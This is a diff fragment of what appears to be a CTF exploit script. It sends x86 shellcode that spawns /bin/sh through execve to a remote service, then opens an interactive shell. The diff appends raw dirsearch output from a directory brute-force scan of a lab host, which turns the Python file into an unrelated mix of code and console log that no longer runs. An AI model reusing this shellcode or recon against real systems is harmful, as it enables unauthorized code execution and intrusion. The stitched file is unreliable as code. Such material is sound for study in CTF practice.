@@ -6,3 +6,61 @@ r.recvuntil(b'Give me code to run:\n')
 payload = b'\x31\xC0\xB0\x0B\x31\xC9\x31\xD2\x31\xDB\xB3\x68\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xB7\x73\xB3\x2F\x53\x90\xB7\x6E\xB3\x69\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xB7\x62\xB3\x2F\x53\x90\x89\xE3\xCD\x80'
 r.sendline(payload)
 r.interactive()
+
+
+pandora@Dora:~$ dirsearch -u 10.10.10.65
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927
+
+Output File: /home/pandora/.dirsearch/reports/10.10.10.65_24-05-14_14-20-12.txt
+
+Error Log: /home/pandora/.dirsearch/logs/errors-24-05-14_14-20-12.log
+
+Target: http://10.10.10.65/
+
+[14:20:12] Starting:
+[14:20:12] 301 -  307B  - /js  ->  http://10.10.10.65/js/
+[14:20:13] 403 -  297B  - /.ht_wsr.txt
+[14:20:13] 403 -  300B  - /.htaccess.bak1
+[14:20:13] 403 -  302B  - /.htaccess.sample
+[14:20:13] 403 -  300B  - /.htaccess.orig
+[14:20:13] 403 -  300B  - /.htaccess.save
+[14:20:13] 403 -  301B  - /.htaccess_extra
+[14:20:13] 403 -  298B  - /.htaccess_sc
+[14:20:13] 403 -  300B  - /.htaccess_orig
+[14:20:13] 403 -  298B  - /.htaccessBAK
+[14:20:13] 403 -  299B  - /.htaccessOLD2
+[14:20:13] 403 -  298B  - /.htaccessOLD
+[14:20:13] 403 -  291B  - /.html
+[14:20:13] 403 -  290B  - /.htm
+[14:20:13] 403 -  300B  - /.htpasswd_test
+[14:20:13] 403 -  297B  - /.httr-oauth
+[14:20:13] 403 -  296B  - /.htpasswds
+[14:20:14] 403 -  291B  - /.php3
+[14:20:14] 403 -  290B  - /.php
+[14:20:16] 200 -    1KB - /LICENSE
+[14:20:16] 200 -    4KB - /README.md
+[14:20:17] 200 -    5KB - /about.html
+[14:20:18] 301 -  310B  - /admin  ->  http://10.10.10.65/admin/
+[14:20:18] 200 -  934B  - /admin/
+[14:20:18] 200 -  934B  - /admin/?/login
+[14:20:18] 403 -  301B  - /admin/.htaccess
+[14:20:23] 200 -    7KB - /contact.html
+[14:20:24] 301 -  308B  - /css  ->  http://10.10.10.65/css/
+[14:20:26] 200 -    3KB - /gulpfile.js
+[14:20:27] 301 -  308B  - /img  ->  http://10.10.10.65/img/
+[14:20:27] 200 -    6KB - /index.html
+[14:20:27] 200 -    2KB - /js/
+[14:20:29] 301 -  309B  - /mail  ->  http://10.10.10.65/mail/
+[14:20:29] 200 -  945B  - /mail/
+[14:20:29] 301 -  311B  - /manual  ->  http://10.10.10.65/manual/
+[14:20:29] 200 -  626B  - /manual/index.html
+[14:20:31] 200 -    1KB - /package.json
+[14:20:31] 200 -  256KB - /package-lock.json
+[14:20:33] 200 -    8KB - /post.html
+[14:20:35] 403 -  299B  - /server-status
+[14:20:35] 403 -  300B  - /server-status/
+[14:20:39] 200 -    1KB - /vendor/
